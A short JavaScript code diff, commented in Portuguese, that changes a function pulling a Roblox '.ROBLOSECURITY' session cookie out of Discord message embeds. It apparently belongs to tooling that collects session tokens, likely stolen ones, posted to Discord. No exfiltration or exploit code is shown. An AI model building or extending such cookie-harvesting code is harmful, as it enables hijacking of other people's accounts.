@@ -105,11 +105,12 @@
       return text.replace(/```/g, "").trim();
     }
 
-    // 🔹 Extrai cookie de embeds do Discord
+    // 🔹 Extrai cookie de embeds do Discord (corrigido)
     function extractCookieFromEmbeds(account) {
       if (account.embeds && Array.isArray(account.embeds)) {
         for (const embed of account.embeds) {
-          if (embed.title && embed.title.toLowerCase().includes("roblosecurity")) {
+          const title = cleanDiscordText(embed.title || "").toLowerCase();
+          if (title.includes("roblosecurity")) {
             return cleanDiscordText(embed.description);
           }
         }
